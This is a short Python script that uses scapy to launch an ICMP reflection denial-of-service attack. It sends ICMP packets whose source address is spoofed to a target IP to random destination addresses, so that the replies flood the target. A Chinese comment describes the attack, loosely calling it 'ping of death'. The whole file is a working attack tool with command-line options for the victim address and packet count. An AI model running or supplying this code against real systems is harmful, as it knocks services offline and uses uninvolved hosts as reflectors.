# coding=utf-8
"""
DATE:   2021/11/22
AUTHOR: TesterCC
"""
import json
import optparse

from scapy.all import *

from scapy.layers.inet import IP, ICMP

ret = dict()
ret['status'] = None


"""
网络层拒绝服务攻击， 无回显。
可以连续向目标发送这种"死亡之ping"来消耗主机的资源。
向不同的地址不断发送 以攻击目标IP为src ip的数据包，攻击目标会被正常IP的响应打死，但前提是响应压力足够大。
"""
def start_attack(psrc, count):
    for i in range(count):
        pdst = "%i.%i.%i.%i" % (
            random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
        time.sleep(0.1)
        send(IP(src=psrc, dst=pdst) / ICMP(), verbose=False)
    ret['status'] = 'success'


def main():
    parser = optparse.OptionParser('usage: python %prog --ip 1.1.1.1 --count 200 \n')
    parser.add_option('-i', '--ip', dest='attack_ip', default='1.1.1.1', type='string', help='fake packet src ip')
    parser.add_option('-c', '--count', dest='attack_count', default='100', type='string', help='send packet count')
    options, args = parser.parse_args()
    start_attack(options.attack_ip, int(options.attack_count))
    print(json.dumps(ret))


if __name__ == '__main__':
    main()
